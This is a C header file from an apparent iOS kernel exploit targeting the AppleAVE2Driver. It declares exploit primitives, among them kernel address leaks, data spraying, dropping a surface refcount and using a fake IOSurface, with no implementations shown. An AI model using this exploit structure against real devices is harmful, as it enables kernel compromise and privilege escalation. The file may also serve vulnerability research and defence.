/*
	Depends heavily on apple_ave_utils (and lightly on other stuff) for exploitation of AppleAVE2Driver
*/

#include <mach/mach.h>
#include <Foundation/Foundation.h>
#include "IOKitLib.h"


#ifndef APPLE_AVE_PWN_H_
#define APPLE_AVE_PWN_H_





kern_return_t apple_ave_pwn_init();
kern_return_t apple_ave_pwn_cleanup();
kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void ** surface_kernel_address);
kern_return_t apple_ave_pwn_put_data_in_bulk(void * address_with_data);
void * apple_ave_pwn_get_bad_surface_kernel_ptr();
kern_return_t apple_ave_pwn_drop_surface_refcount(void * surface_kernel_address);
kern_return_t apple_ave_pwn_use_fake_iosurface(void * fake_iosurface_address);

#endif /* APPLE_AVE_PWN_H_ */
